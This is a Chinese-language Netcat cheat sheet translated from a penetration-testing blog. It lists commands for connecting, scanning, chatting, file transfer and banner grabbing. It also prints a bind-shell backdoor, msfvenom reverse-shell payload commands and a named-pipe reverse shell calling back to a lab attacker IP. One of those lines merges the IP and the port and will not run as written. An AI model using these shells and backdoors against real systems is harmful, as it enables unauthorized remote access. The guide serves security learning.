## Netcat综合指南

- Introduction [^1]

- Features

  - 充当简单的TCP / UDP / SCTP / SSL客户端，用于与Web服务器，Telnet服务器，邮件服务器和其他TCP / IP网络服务进行交互。通常，理解服务（解决问题，发现安全漏洞或测试自定义命令）的最佳方法是使用Netcat与其进行交互。您可以控制发送的每个字符并查看未经过滤的原始响应
  - 将TCP / UDP / SCTP流量重定向或代理到其他端口或主机。
    这可以使用简单的重定向（发送到端口的所有内容自动在您预先指定的其他位置中继）或通过充当SOCKS或HTTP代理来完成，以便客户端指定自己的目标。
    在客户端模式下，Netcat可以通过匿名链接或目标链接到目标认证代理
  - 加密与SSL的通信，并通过IPv4或IPv6传输。
  - 充当执行系统命令的网络网关，I / O重定向到网络。
    它被设计为像Unix实用程序cat一样工作，但对于网络。
  - 充当连接代理，允许两个（或更多）客户端通过第三个（代理）服务器相互连接。
    这使得隐藏在NAT网关后面的多台机器能够相互通信，并且还可以实现简单的Netcat聊天模式。

- Getting start with NC

  - `nc -h`

- Connecting to a Server

  - `nc 192.168.1.12 21`

- Fetching HTTP header

  - 我们可以使用netcat来获取有关任何Web服务器的信息。让我们回到之前连接的服务器。
    它还在端口80上运行HTTP服务。因此，我们使用netcat连接到HTTP服务，就像我们之前做的那样。
    现在连接到服务器后，我们使用的选项将为我们提供标头以及在远程服务器上运行的HTTP服务的源代码。
  - `nc 192.168.1.12 80`
  - HEAD/HTTP/1.0

- Chatting 

  - Netcat还可用于在两个用户之间进行聊天。我们需要在聊天之前建立连接。
    要做到这一点，我们将需要两个设备。一个人将扮演发起者的角色，一个人将成为开始对话的倾听者，因此一旦建立了连接，就可以从两端进行通信。在这里，我们将创建一个使用不同操作系统在两个用户之间聊天的场景。
  - `nc -lvvp 4444` [^2]
  - `nc 192.168.50.220 4444`

- Creating a Backdoor

  - `nc -l -p 2222 -e /bin/bash` [^3]
  - `nc 192.168.1.35 2222`

- Verbose Mode [^4]

  - `nc 192.168.1.6 21 -v`

- Save Output to Disk

  - `nc 192.168.1.6 21 -v -o /root/output.txt`

- Port Scanning

  - TCP Scan
    - `nc -v -n -z -w 2 192.168.1.6 21-1100 `[^5]
  - TCP Delay Scan
    - `nc -z -v -i 10 192.168.1.6 21-80`
  - UDP Scan
    - `nc -vzu 192.168.1.6 80-90`

- Reverse TCP Shell Exploitation [^6]

  - `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.35 lport=2124 -f exe > /root/Desktop/1.exe`
  - `nc -lvvp 2124`

- Randomize Port [^7]

  - `nc -lv -r`

- File Transfer [^8]

  - ```shell
    #target host
    nc -v -w 30 -p 8888 -l < C:\netcat\output.txt
    #kali
    nc -v -w 2 192.168.1.4 8888 > output.txt
    ```

- Reverse Netcat Shell Exploitation

  - ```shell
    #kali
    msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.35 lport=6666 R 
    #将生成的命令在target host上执行
    ```

  - ```shell
    #target host
    mknod /tmp/backpipe p
    /bin/sh 0</tmp/backpipe | nc 192.168.1.35443 1>/tmp/backpipe
    #kali
    nc -lvp 443 
    ```

- Banner grabbing

  - `nc -v 192.168.1.2 22`

[原文](https://www.hackingarticles.in/comprehensive-guide-on-netcat/)

---

[^1]: Netcat或nc是一种实用工具，它使用TCP和UDP连接在网络中进行读写。
[^2]: -l 监听模式、-vv 可以使用一个，多一个更详细、-p 端口
[^3]: 这将在系统上打开一个侦听器，它将命令shell或Linux bash shell传递给连接系统。
[^4]: 在netcat中，Verbose是一种可以使用[-v]参数启动的模式。现在详细模式生成扩展信息。基本上，我们将使用netcat连接到服务器两次，以查看正常模式和详细模式之间的区别.当我们将[-v]添加到netcat命令时，它会显示有关连接到服务器时其性能的进程的信息。
[^5]: [-v]：表示详细模式、[-n]：表示仅数字的IP地址、[-z]：表示零-I / O模式[用于扫描]、 [-w]：表示连接超时和最终网络读取
[^6]: 我们可以使用msfvenom和netcat的组合来利用系统。我们将使用msfvenom创建有效负载和netcat来监听会话。首先，我们必须创建一个有效载荷。
[^7]: 如果我们无法决定我们自己的端口来启动监听器或建立我们的Netcat连接。
[^8]: 在这里，我们将创建一个场景，我们将文件从Windows系统传输到Kali Linux系统。要从Windows发送文件，我们将使用以下命令